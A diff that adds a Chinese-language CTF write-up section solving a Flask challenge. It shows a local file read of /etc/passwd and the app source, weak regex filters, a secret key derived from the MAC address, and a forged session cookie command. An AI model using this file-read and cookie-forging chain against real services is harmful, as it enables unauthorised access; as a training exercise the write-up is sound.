@@ -73,3 +73,72 @@ payload = urllib.parse.quote(key.crypt(cmd))
 res = requests.get(url + payload)
 print(res.text)
 ```
+
+## Web4
+
+可以read url 题目给了``http://baidu.com``
+
+fuzz了半天
+
+发现不加协议头也能读文件....
+
+```
+GET /read?url=/etc/passwd
+```
+
+然后读``app.py``看到了源码
+
+```python
+# encoding:utf-8
+import re, random, uuid, urllib
+from flask import Flask, session, request
+
+app = Flask(__name__)
+random.seed(uuid.getnode())
+app.config['SECRET_KEY'] = str(random.random()*233)
+app.debug = True
+
+@app.route('/')
+def index():
+    session['username'] = 'www-data'
+    return 'Hello World! <a href="/read?url=https://baidu.com">Read somethings</a>'
+
+@app.route('/read')
+def read():
+    try:
+        url = request.args.get('url')
+        m = re.findall('^file.*', url, re.IGNORECASE)
+        n = re.findall('flag', url, re.IGNORECASE)
+        if m or n:
+            return 'No Hack'
+        res = urllib.urlopen(url)
+        return res.read()
+    except Exception as ex:
+        print str(ex)
+    return 'no response'
+
+@app.route('/flag')
+def flag():
+    if session and session['username'] == 'fuck':
+        return open('/flag.txt').read()
+    else:
+        return 'Access denied'
+
+if __name__=='__main__':
+    app.run(
+        debug=True,
+        host="0.0.0.0"
+    )
+
+```
+
+所以可以算secretkey了
+
+读网卡地址``/sys/class/net/eth0/address``
+
+拿到``uuid.getnode()``
+
+然后用``flask_session_cookie_manager2.py``算就可以了
+```
+python2 flask_session_cookie_manager2.py encode -s '23.2201597013' -t '{"username":"fuck"}'
+```
